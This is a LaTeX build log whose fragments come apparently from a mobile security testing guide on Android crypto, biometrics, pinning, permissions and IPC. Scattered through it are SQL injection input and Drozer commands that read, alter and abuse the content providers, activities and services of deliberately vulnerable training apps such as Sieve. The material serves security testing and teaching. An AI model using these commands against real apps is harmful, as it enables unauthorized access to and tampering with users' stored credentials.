/m/n/10.95 OpenSSLSocketImpl \TU/SourceSansPro(0)/m/n/10.95 to \TU/SourceCodePr
o(6)/m/n/10.95 ConscryptFileDescriptorSocket\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (50.72498pt too wide) in paragraph at lines 20400--20402
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 Crypto \TU/
SourceSansPro(0)/m/n/10.95 security provider is now removed. Calling it will re
sult in a \TU/SourceCodePro(6)/m/n/10.95 NoSuchProviderException\TU/SourceSansP
ro(0)/m/n/10.95 . 
[361]
Underfull \hbox (badness 5260) in paragraph at lines 20426--20429
[]\TU/SourceSansPro(0)/m/n/10.95 You should stop specifying a security provider
 and use the default implementation (An-
[362]
Overfull \hbox (40.79941pt too wide) in paragraph at lines 20487--20487
[]\TU/SourceCodePro(6)/m/n/10.95 provider: Crypto1.0 (HARMONY (SHA1 digest; Sec
ureRandom; SHA1withDSA signature))[] 

Overfull \hbox (42.98943pt too wide) in paragraph at lines 20500--20500
[]\TU/SourceCodePro(6)/m/n/10.95 provider: CertPathProvider 1.0(Provider of Cer
tPathBuilder and CertPathVerifier)[] 

Overfull \hbox (205.04938pt too wide) in paragraph at lines 20500--20500
[]\TU/SourceCodePro(6)/m/n/10.95 provider: AndroidKeyStoreBCWorkaround 1.0(Andr
oid KeyStore security provider to work around Bouncy Castle)[] 

Underfull \hbox (badness 1924) in paragraph at lines 20506--20513
[]\TU/SourceSansPro(0)/m/n/10.95 Keeping up-to-date and patched component is on
e of security principles. The same applies to
[363]
Underfull \hbox (badness 1082) in paragraph at lines 20562--20570
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 KeyGenParam
eterSpec \TU/SourceSansPro(0)/m/n/10.95 indicates that the key can be used for 
encryption and decryption,
[364]
Underfull \hbox (badness 3849) in paragraph at lines 20627--20630
[]\TU/SourceSansPro(0)/m/n/10.95 Since the IV is randomly generated each time, 
it should be saved along with the cipher text
[365] [366] [367]
Underfull \hbox (badness 1264) in paragraph at lines 20797--20800
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[368]
Overfull \hbox (17.84456pt too wide) in paragraph at lines 20894--20897
[]\TU/SourceSansPro(0)/m/n/10.95 exceptions \TU/SourceCodePro(6)/m/n/10.95 KeyS
toreException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 Ce
rtificateException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 NoSuchAlgorithmException 

Underfull \hbox (badness 1264) in paragraph at lines 20897--20900
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[369]
Overfull \hbox (17.84456pt too wide) in paragraph at lines 20965--20968
[]\TU/SourceSansPro(0)/m/n/10.95 exceptions \TU/SourceCodePro(6)/m/n/10.95 KeyS
toreException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 Ce
rtificateException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 NoSuchAlgorithmException 

Underfull \hbox (badness 1264) in paragraph at lines 20968--20971
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[370] [371] [372]
Underfull \hbox (badness 2781) in paragraph at lines 21148--21151
[]\TU/SourceSansPro(0)/m/n/10.95 Android Developer blog: Cryptography Changes i
n Android P - [][]$[][][][][] [] [] [] [][][][][][][] [][] [][][][][][][][][][]
 []

Underfull \hbox (badness 10000) in paragraph at lines 21179--21182
[]\TU/SourceSansPro(0)/m/n/10.95 Burpproxy its Sequencer - [][]$[][][][][] [] [
] [] [][][][][][][][][][][] [] [][][] [] [][][][] [] [][][][][][][][][][][][][]
 [] [][][][][][][] [] [][][][][] []
[373]
Underfull \hbox (badness 3118) in paragraph at lines 21205--21208
[]\TU/SourceSansPro(0)/m/n/10.95 KeyInfo Documentation - [][]$[][][][][] [] [] 
[] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][][] [] [][]
[][][][][] [] [][][][][][][][] [] [][][][][][][][] []

Overfull \hbox (10.94618pt too wide) in paragraph at lines 21208--21210
[]\TU/SourceSansPro(0)/m/n/10.95 SharedPreferences - [][]$[][][][][] [] [] [] [
][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][][] [] [][][][]
[][][] [] [][][][][][][] [] [][][][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 21219--21222
[]\TU/SourceSansPro(0)/m/n/10.95 Android Key Attestation - [][]$[][][][][] [] [
] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][]
[][][][][][] [] [][][][][][][][] [][] [][][] [][]

Overfull \hbox (14.96843pt too wide) in paragraph at lines 21222--21225
[]\TU/SourceSansPro(0)/m/n/10.95 Attestation and Assertion - [][]$[][][][][] []
 [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][] [][] [][] [] [][]
[][] [] [][][] [] [][][] [] [][][] [] [][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 21228--21231
[]\TU/SourceSansPro(0)/m/n/10.95 FIDO Alliance Whitepaper - [][]$[][][][][] [] 
[] [] [][][][][][][][][][][][] [] [][][] [] [][] [][] [][][][][][][] [] [][][][
][][][] [] [][][][][][][][] [][] [][][][][][] []
[374]
Underfull \hbox (badness 2359) in paragraph at lines 21303--21311
\TU/SourceSansPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 setUserAuthentic
ationValidityDurationSeconds\TU/SourceSansPro(0)/m/n/10.95 ), otherwise the dev
ice needs to be
[375] [376]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/190c3e989709cec2b899e4a0ad6740fff69ed529.
png" >
Overfull \hbox (2.65039pt too wide) in paragraph at lines 21449--21451
[][]\TU/SourceSansPro(0)/m/n/10.95 {
[377]
Underfull \hbox (badness 2181) in paragraph at lines 21476--21488
[]\TU/SourceSansPro(0)/m/n/10.95 Android 6.0 (API level 23) introduced public A
PIs for authenticating users via fingerprint, but is

Underfull \hbox (badness 1454) in paragraph at lines 21476--21488
[][]\TU/SourceCodePro(6)/m/n/10.95 FingerprintManager[][] \TU/SourceSansPro(0)/
m/n/10.95 class. An app can request fingerprint authentication by instantiating
 a
[378]
Underfull \hbox (badness 5203) in paragraph at lines 21489--21500
[]\TU/SourceSansPro(0)/m/n/10.95 You can achieve better security by using the f
ingerprint API in conjunction with the Android

Overfull \hbox (27.9417pt too wide) in paragraph at lines 21489--21500
\TU/SourceSansPro(0)/m/n/10.95 created which encrypts the authentication token.
 By calling \TU/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired(true)

Overfull \hbox (8.29257pt too wide) in paragraph at lines 21520--21525
[]\TU/SourceSansPro(0)/m/n/10.95 Android provides a library called [][]Biometri
c[][] which offers a compatibility version of the \TU/SourceCodePro(6)/m/n/10.9
5 BiometricPrompt

Underfull \hbox (badness 4132) in paragraph at lines 21542--21548
[]\TU/SourceSansPro(0)/m/n/10.95 The app creates a key in the KeyStore with \TU
/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired \TU/SourceSansPro(0)/
m/n/10.95 and

Overfull \hbox (187.99045pt too wide) in paragraph at lines 21542--21548
\TU/SourceCodePro(6)/m/n/10.95 setInvalidatedByBiometricEnrollment \TU/SourceSa
nsPro(0)/m/n/10.95 set to true. Additionally, \TU/SourceCodePro(6)/m/n/10.95 se
tUserAuthenticationValidityDurationSeconds
[379]
Overfull \hbox (26.05118pt too wide) in paragraph at lines 21573--21580
[]\TU/SourceSansPro(0)/m/n/10.95 This section describes how to implement biomet
ric authentication by using the \TU/SourceCodePro(6)/m/n/10.95 FingerprintManag
er

Overfull \hbox (107.51051pt too wide) in paragraph at lines 21590--21596
\TU/SourceSansPro(0)/m/n/10.95 Verify the key was both created using the \TU/So
urceCodePro(6)/m/n/10.95 KeyGenerator \TU/SourceSansPro(0)/m/n/10.95 class in a
ddition to \TU/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired(true)
[380]
Overfull \hbox (31.10501pt too wide) in paragraph at lines 21683--21687
\TU/SourceSansPro(0)/m/n/10.95 class by adding \TU/SourceCodePro(6)/m/n/10.95 s
etUserAuthenticationRequired(true) \TU/SourceSansPro(0)/m/n/10.95 in \TU/Source
CodePro(6)/m/n/10.95 KeyGenParameterSpec.Builder\TU/SourceSansPro(0)/m/n/10.95 
. 
[381]
Underfull \hbox (badness 1590) in paragraph at lines 21716--21721
[]\TU/SourceSansPro(0)/m/n/10.95 Keep in mind, a new key cannot be used immedia
tely - it has to be authenticated through the

Overfull \hbox (88.67403pt too wide) in paragraph at lines 21716--21721
\TU/SourceCodePro(6)/m/n/10.95 FingerprintManager \TU/SourceSansPro(0)/m/n/10.9
5 first. This involves wrapping the \TU/SourceCodePro(6)/m/n/10.95 Cipher \TU/S
ourceSansPro(0)/m/n/10.95 object into \TU/SourceCodePro(6)/m/n/10.95 Fingerprin
tManager.CryptoObject

Overfull \hbox (209.41478pt too wide) in paragraph at lines 21729--21733
[]\TU/SourceSansPro(0)/m/n/10.95 When the authentication succeeds, the callback
 method \TU/SourceCodePro(6)/m/n/10.95 onAuthenticationSucceeded(FingerprintMan
ager.AuthenticationResult
[382]
Underfull \hbox (badness 2229) in paragraph at lines 21772--21774
[]\TU/SourceSansPro(0)/m/n/10.95 To use the key for signing, you need to instan
tiate a CryptoObject and authenticate it through

Underfull \hbox (badness 3724) in paragraph at lines 21809--21811
[]\TU/SourceSansPro(0)/m/n/10.95 To implement authentication using symmetric fi
ngerprint authentication, use a challenge-

Underfull \hbox (badness 6575) in paragraph at lines 21817--21825
[]\TU/SourceSansPro(0)/m/n/10.95 Android 7.0 (API level 24) adds the \TU/Source
CodePro(6)/m/n/10.95 setInvalidatedByBiometricEnrollment(boolean
[383] [384]
Underfull \hbox (badness 1168) in paragraph at lines 21938--21945
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that the hostname and the certificat
e itself are verified correctly. Examples and com-

Overfull \hbox (37.4933pt too wide) in paragraph at lines 21947--21950
[]\TU/SourceSansPro(0)/m/n/10.95 Note that from Android 8.0 (API level 26) onwa
rd, there is no support for SSLv3 and \TU/SourceCodePro(6)/m/n/10.95 HttpsURLCo
nnection
[385]
Overfull \hbox (8.11008pt too wide) in paragraph at lines 21973--21979
\TU/SourceSansPro(0)/m/n/10.95 writing the functions \TU/SourceCodePro(6)/m/n/1
0.95 checkClientTrusted\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/
n/10.95 checkServerTrusted\TU/SourceSansPro(0)/m/n/10.95 , and \TU/SourceCodePr
o(6)/m/n/10.95 getAcceptedIssuers\TU/SourceSansPro(0)/m/n/10.95 .
[386] [387] [388] [389]
Underfull \hbox (badness 4467) in paragraph at lines 22221--22224
[]\TU/SourceSansPro(0)/m/n/10.95 First, find the Network Security Configuration
 file in the Android application manifest via the
[390]
Overfull \hbox (119.63937pt too wide) in paragraph at lines 22271--22271
[]\TU/SourceCodePro(6)/m/n/10.95 D/NetworkSecurityConfig: Using Network Securit
y Config from resource network_security_config[] 

Overfull \hbox (60.50938pt too wide) in paragraph at lines 22278--22278
[]\TU/SourceCodePro(6)/m/n/10.95 I/X509Util: Failed to validate the certificate
 chain, error: Pin verification failed[] 
[391] [392]
Overfull \hbox (2859.5245pt too wide) in paragraph at lines 22396--22396
[]\TU/SourceCodePro(6)/m/n/10 "3082010A02820101009CD30CF05AE52E47B7725D3783B368
6330EAD735261925E1BDBE35F170922FB7B84B4105ABA99E350858ECB12AC468870BA3E375E4E6F
3A76271BA7981601FD7919A9FF3D0786771C8690E9591CFFEE699E9603C48CC7ECA4D7712249D47
1B5AEBB9EC1E37001C9CAC7BA705EACE4AEBBD41E53698B9CBFD6D3C9668DF232A42900C867467C
87FA59AB8526114133F65E98287CBDBFA0E56F68689F3853F9786AFB0DC1AEF6B0D95167DC42BA0
65B299043675806BAC4AF31B9049782FA2964F2A20252904C674C0D031CD8F31389516BAA833B84
3F1B11FC3307FA27931133D2D36F8E3FCF2336AB93931C5AFC48D0D1D641633AAFA8429B6D40BC0
D87DC3930203010001"[];|  

Overfull \hbox (3.5245pt too wide) in paragraph at lines 22405--22405
\TU/SourceCodePro(6)/m/it/10 ning",chain.ChainElements[X].Certificate.GetPublic
KeyString());[]|  
[393] [394] [395]
Overfull \hbox (1159.88916pt too wide) in paragraph at lines 22579--22579
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -importcert -v -trustcacerts -file p
roxy.cer -alias aliascert -keystore "res/raw/truststore.bks" -provider org.boun
cycastle.jce.provider.BouncyCastleProvider -providerpath "providerpath/bcprov-j
dk15on-164.jar" -storetype BKS -storepass password[] 

Overfull \hbox (809.48923pt too wide) in paragraph at lines 22585--22585
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -list -keystore "res/raw/truststore.
bks" -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath
 "providerpath/bcprov-jdk15on-164.jar"  -storetype BKS -storepass password[] 
[396] [397]
Underfull \hbox (badness 4634) in paragraph at lines 22714--22722
\TU/SourceSansPro(0)/m/n/10.95 entry or in a parent \TU/SourceCodePro(6)/m/n/10
.95 <domain-config\>\TU/SourceSansPro(0)/m/n/10.95 , the configurations in plac
e will be based on the
[398] [399] [400] [401] [402]
Overfull \hbox (24.08975pt too wide) in paragraph at lines 22999--23004
[]\TU/SourceSansPro(0)/m/n/10.95 Use Xposed to hook into the \TU/SourceCodePro(
6)/m/n/10.95 java.security \TU/SourceSansPro(0)/m/n/10.95 package, then hook in
to \TU/SourceCodePro(6)/m/n/10.95 java.security.Security
[403]
Underfull \hbox (badness 10000) in paragraph at lines 23043--23045
[]\TU/SourceSansPro(0)/m/n/10.95 Network Security Config (cached alternative) -
 [][]$[][][][][] [] [] [] [][][][][][][][] [] [][][][][][][][][][][][][][][][][
] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 23043--23045
[][][][][][] [] [] [] [][][][][] [] [][][][][][][][][][][][] [] [][][][][] [] [
] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][]
[][][][][][] [] [][][][][][][][] [][]

Underfull \hbox (badness 2237) in paragraph at lines 23054--23057
[]\TU/SourceSansPro(0)/m/n/10.95 Certificate and Public Key Pinning with Xamari
n - [][]$[][][][][] [] [] [] [][][][][][][][][][][] [] [][][] [] [][][][][][][]
[][][][] [][] [][][] [][]

Overfull \hbox (22.34132pt too wide) in paragraph at lines 23057--23059
[]\TU/SourceSansPro(0)/m/n/10.95 ServicePointManager - [][]$[][][][][] [] [] []
 [][][][] [] [][][][][][][][][] [] [][][] [] [][] [][] [][] [] [][][][][][][] [
] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][][][][][][][][] []

Overfull \hbox (22.69469pt too wide) in paragraph at lines 23068--23070
[]\TU/SourceSansPro(0)/m/n/10.95 PhoneGap SSL Certificate Checker plugin - [][]
$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][] [] 
[][][][][][][][][][][][][][][][][][][][][] [][]
[404] [405]
Underfull \hbox (badness 1394) in paragraph at lines 23174--23188
[]\TU/SourceSansPro(0)/bx/n/10.95 Restrictions when granting dangerous permissi
ons\TU/SourceSansPro(0)/m/n/10.95 : Dangerous permissions are classified

Underfull \hbox (badness 1968) in paragraph at lines 23190--23199
[]\TU/SourceSansPro(0)/m/n/10.95 Suppose an app lists both READ_EXTERNAL_STORAG
E and WRITE_EXTERNAL_STORAGE

Underfull \hbox (badness 1715) in paragraph at lines 23190--23199
\TU/SourceSansPro(0)/m/n/10.95 at the same time, because it belongs to the same
 STORAGE permission group and is

Underfull \hbox (badness 1097) in paragraph at lines 23190--23199
\TU/SourceSansPro(0)/m/n/10.95 grants only READ_EXTERNAL_STORAGE at that time; 
however, if the app later requests

Overfull \hbox (45.5809pt too wide) in paragraph at lines 23224--23231
[]\TU/SourceSansPro(0)/bx/n/10.95 Restricted access to call logs\TU/SourceSansP
ro(0)/m/n/10.95 : \TU/SourceCodePro(6)/m/n/10.95 READ_CALL_LOG\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 WRITE_CALL_LOG\TU/SourceSansPro(
0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 PROCESS_OUTGOING_CALLS
[406]
Underfull \hbox (badness 1303) in paragraph at lines 23307--23314
\TU/SourceSansPro(0)/m/n/10.95 ifest restrict who can start or bind to the asso
ciated Service. The permission is checked during
[407]
Underfull \hbox (badness 3803) in paragraph at lines 23355--23362
\TU/SourceCodePro(6)/m/n/10.95 ContentResolver.insert\TU/SourceSansPro(0)/m/n/1
0.95 , \TU/SourceCodePro(6)/m/n/10.95 ContentResolver.update\TU/SourceSansPro(0
)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 ContentResolver.delete \TU/SourceS
ansPro(0)/m/n/10.95 re-

Overfull \hbox (72.93692pt too wide) in paragraph at lines 23373--23379
\TU/SourceSansPro(0)/m/n/10.95 set \TU/SourceCodePro(6)/m/n/10.95 Intent.FLAG_G
RANT_READ_URI_PERMISSION \TU/SourceSansPro(0)/m/n/10.95 and/or \TU/SourceCodePr
o(6)/m/n/10.95 Intent.FLAG_GRANT_WRITE_URI_PERMISSION\TU/SourceSansPro(0)/m/n/1
0.95 .
[408]
Underfull \hbox (badness 3439) in paragraph at lines 23406--23413
[]\TU/SourceSansPro(0)/m/n/10.95 Android allows apps to expose their services/c
omponents to other apps. Custom permissions

Underfull \hbox (badness 1308) in paragraph at lines 23406--23413
\TU/SourceSansPro(0)/m/n/10.95 are required for app access to the exposed compo
nents. You can define [][]custom permissions[][] in

Overfull \hbox (4.86523pt too wide) in paragraph at lines 23406--23413
\TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(0)/m/n/10.
95 by creating a permission tag with two mandatory attributes: \TU/SourceCodePr
o(6)/m/n/10.95 android:name
[409]
Underfull \hbox (badness 3701) in paragraph at lines 23450--23462
[]\TU/SourceSansPro(0)/m/n/10.95 Once the permission \TU/SourceCodePro(6)/m/n/1
0.95 START_MAIN_ACTIVITY \TU/SourceSansPro(0)/m/n/10.95 has been created, apps 
can request it via the

Underfull \hbox (badness 1371) in paragraph at lines 23450--23462
\TU/SourceCodePro(6)/m/n/10.95 uses-permission \TU/SourceSansPro(0)/m/n/10.95 t
ag in the \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(
0)/m/n/10.95 file. Any application granted the cus-

Underfull \hbox (badness 3769) in paragraph at lines 23450--23462
\TU/SourceSansPro(0)/m/n/10.95 tom permission \TU/SourceCodePro(6)/m/n/10.95 ST
ART_MAIN_ACTIVITY \TU/SourceSansPro(0)/m/n/10.95 can then launch the \TU/Source
CodePro(6)/m/n/10.95 TEST_ACTIVITY\TU/SourceSansPro(0)/m/n/10.95 . Please note
[410] [411]
Underfull \hbox (badness 1859) in paragraph at lines 23577--23585
\TU/SourceSansPro(0)/m/n/10.95 missions programmatically. This is not recommend
ed, however, because it is more error-prone
[412] [413] [414] [415]
Overfull \hbox (56.13431pt too wide) in paragraph at lines 23763--23767
\TU/SourceSansPro(0)/m/n/10.95 essary for the app. For instance: a single-playe
r game that requires access to \TU/SourceCodePro(6)/m/n/10.95 android.permissio
n.WRITE_SMS\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (3.5245pt too wide) in paragraph at lines 23821--23821
\TU/SourceCodePro(6)/m/n/10 droid:name=[][]".OMTG_CODING_003_SQL_Injection_Cont
ent_Provider_Implementation"[]|  
[416]
Overfull \hbox (160.94403pt too wide) in paragraph at lines 23827--23832
\TU/SourceSansPro(0)/m/n/10.95 to all other apps. The \TU/SourceCodePro(6)/m/n/
10.95 query \TU/SourceSansPro(0)/m/n/10.95 function in the \TU/SourceCodePro(6)
/m/n/10.95 OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.java
[417]
Overfull \hbox (82.99635pt too wide) in paragraph at lines 23872--23880
[]\TU/SourceSansPro(0)/m/n/10.95 While the user is providing a STUDENT_ID at \T
U/SourceCodePro(6)/m/n/10.95 content://sg.vp.owasp_mobile.provider.College/stud
ents\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (21.0894pt too wide) in paragraph at lines 23925--23925
[]\TU/SourceCodePro(6)/m/n/10.95 # content query --uri content://sg.vp.owasp_mo
bile.provider.College/students[] 

Overfull \hbox (229.1393pt too wide) in paragraph at lines 23932--23932
[]\TU/SourceCodePro(6)/m/n/10.95 # content query --uri content://sg.vp.owasp_mo
bile.provider.College/students --where "name=[]Bob[]) OR 1=1--[][]"[] 
[418]
Overfull \hbox (271.57433pt too wide) in paragraph at lines 23948--23954
[]\TU/SourceSansPro(0)/m/n/10.95 This abstract class parses the extra data fiel
ds of an Intent, in particular, the \TU/SourceCodePro(6)/m/n/10.95 PreferenceAc
tivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)

Overfull \hbox (88.31508pt too wide) in paragraph at lines 23948--23954
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 PreferenceAct
ivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)
[419] [420]
Overfull \hbox (64.52951pt too wide) in paragraph at lines 24076--24076
| | | |\TU/SourceCodePro(6)/m/n/10 i.[]setClassName[]([]"pt.claudio.insecurefra
gment"[],[]"pt.claudio.insecurefragment.MainActivity"[]);|  

Overfull \hbox (187.09499pt too wide) in paragraph at lines 24102--24107
[]\TU/SourceSansPro(0)/m/n/10.95 Consider this contrived example: \TU/SourceCod
ePro(6)/m/n/10.95 sms://compose/to=your.boss@company.com&message=I%20QUIT!&send
Immediately=true\TU/SourceSansPro(0)/m/n/10.95 .

Underfull \hbox (badness 1072) in paragraph at lines 24122--24131
\TU/SourceSansPro(0)/m/n/10.95 mobile app via a link, which isn’t inherently ri
sky. Alternatively, since Android 6.0 (API level 23)
[421]
Underfull \hbox (badness 3907) in paragraph at lines 24175--24179
[]\TU/SourceSansPro(0)/m/n/10.95 Data can then be transmitted through this new 
scheme with, for example, the following URI:

Underfull \hbox (badness 10000) in paragraph at lines 24175--24179
\TU/SourceCodePro(6)/m/n/10.95 myapp://path/to/what/i/want?keyOne=valueOne&keyT
wo=valueTwo\TU/SourceSansPro(0)/m/n/10.95 . Code like
[422]
Overfull \hbox (47.36942pt too wide) in paragraph at lines 24209--24209
[]    \TU/SourceCodePro(6)/m/n/10.95 com.google.android.apps.messaging.ui.conve
rsation.LaunchConversationActivity[] 

Overfull \hbox (126.2094pt too wide) in paragraph at lines 24216--24216
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.activity.start  --action android.i
ntent.action.VIEW --data-uri "sms://0123456789"[] 
[423]
Overfull \hbox (32.0394pt too wide) in paragraph at lines 24312--24312
[]\TU/SourceCodePro(6)/m/n/10.95 $ cd path/to/android/sdk/tools/bin && ./sdkman
ager []extras;google;instantapps[][] 

Underfull \hbox (badness 1383) in paragraph at lines 24314--24317
[]\TU/SourceSansPro(0)/m/n/10.95 Next, you have to add \TU/SourceCodePro(6)/m/n
/10.95 path/to/android/sdk/extras/google/instantapps/ia \TU/SourceSansPro(0)/m/
n/10.95 to your
[424]
Underfull \hbox (badness 1394) in paragraph at lines 24420--24433
\TU/SourceSansPro(0)/m/n/10.95 ways to designate a component as exported. The o
bvious one is setting the export tag to true
[425] [426]
Overfull \hbox (147.5245pt too wide) in paragraph at lines 24535--24535
\TU/SourceCodePro(6)/m/n/10 vice.[]this[].[]setKey[](returnBundle.[]getString[]
([]"com.mwr.example.sieve.PASSWORD"[]))) 
[427]
Overfull \hbox (117.5245pt too wide) in paragraph at lines 24542--24542
\TU/SourceCodePro(6)/m/n/10 vice.[]this[].[]setPin[](returnBundle.[]getString[]
([]"com.mwr.example.sieve.PIN"[]))) 

Underfull \hbox (badness 1888) in paragraph at lines 24563--24565
[]\TU/SourceSansPro(0)/m/n/10.95 In the “Android Insecure Bank” app, we find a 
broadcast receiver in the manifest, identified by

Underfull \hbox (badness 10000) in paragraph at lines 24579--24582
[]\TU/SourceSansPro(0)/m/n/10.95 Search the source code for strings like \TU/So
urceCodePro(6)/m/n/10.95 sendBroadcast\TU/SourceSansPro(0)/m/n/10.95 , \TU/Sour
ceCodePro(6)/m/n/10.95 sendOrderedBroadcast\TU/SourceSansPro(0)/m/n/10.95 , and

[428]
Underfull \hbox (badness 1546) in paragraph at lines 24588--24593
\TU/SourceSansPro(0)/m/n/10.95 analysis and search for usage of the class \TU/S
ourceCodePro(6)/m/n/10.95 android.content.BroadcastReceiver \TU/SourceSansPro(0
)/m/n/10.95 and the
[429] [430]
Overfull \hbox (56.1294pt too wide) in paragraph at lines 24686--24686
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys[] 

Overfull \hbox (923.36919pt too wide) in paragraph at lines 24686--24686
[]\TU/SourceCodePro(6)/m/n/10.95 Permission Denial: reading com.mwr.example.sie
ve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys
 from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUri
Permission()[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 24692--24692
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys/[] 

Overfull \hbox (419.66931pt too wide) in paragraph at lines 24701--24701
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.update content://com.mwr.
example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password 
"newpassword"[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 24701--24701
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys/[] 

Overfull \hbox (119.00435pt too wide) in paragraph at lines 24721--24725
[]\TU/SourceSansPro(0)/m/n/10.95 Enumerating activities in the vulnerable passw
ord manager “Sieve” shows that the activity \TU/SourceCodePro(6)/m/n/10.95 com.
mwr.example.sieve.PWList

Overfull \hbox (104.30939pt too wide) in paragraph at lines 24728--24728
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.activity.start --component com.mwr
.example.sieve com.mwr.example.sieve.PWList[] 
[431]
Overfull \hbox (678.08928pt too wide) in paragraph at lines 24763--24763
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.service.send com.mwr.example.sieve
 com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.exa
mple.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj[] 

Overfull \hbox (1.3794pt too wide) in paragraph at lines 24763--24763
[]\TU/SourceCodePro(6)/m/n/10.95 Got a reply from com.mwr.example.sieve/com.mwr
.example.sieve.AuthService:[] 
[432]
Overfull \hbox (270.74934pt too wide) in paragraph at lines 24791--24791
[]\TU/SourceCodePro(6)/m/n/10.95 dz>  run app.broadcast.send --action theBroadc
ast --extra string phonenumber 07123456789 --extra string newpass 12345[] 
[433]
Underfull \hbox (badness 3128) in paragraph at lines 24884--24887
[]\TU/SourceSansPro(0)/m/n/10.95 To remove all JavaScript source code and local
ly stored data, clear the WebView’s cache with
[434]
Underfull \hbox (badness 1939) in paragraph at lines 24983--24991
[]\TU/SourceCodePro(6)/m/n/10.95 setAllowFileAccess\TU/SourceSansPro(0)/m/n/10.
95 : Enables and disables file access within a WebView. File access

Underfull \hbox (badness 2781) in paragraph at lines 24983--24991
\TU/SourceSansPro(0)/m/n/10.95 is enabled by default. Note that this enables an
d disables [][]file system access[][] only. As-

Underfull \hbox (badness 2142) in paragraph at lines 24983--24991
\TU/SourceSansPro(0)/m/n/10.95 set and resource access is unaffected and access
ible via \TU/SourceCodePro(6)/m/n/10.95 file:///android_asset \TU/SourceSansPro
(0)/m/n/10.95 and
[435] [436] [437] [438] [439]
Underfull \hbox (badness 2035) in paragraph at lines 25261--25280
[]\TU/SourceSansPro(0)/m/n/10.95 There are several ways to serialize the conten
ts of an object to JSON. Android comes with the
[440] [441] [442]
Overfull \hbox (6.48947pt too wide) in paragraph at lines 25433--25439
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that sensitive data has been encrypt
ed and HMACed/signed after serialization/persistence.
[443]
Underfull \hbox (badness 1983) in paragraph at lines 25573--25576
[]\TU/SourceSansPro(0)/m/n/10.95 In the AndroidManifest, there will be \TU/Sour
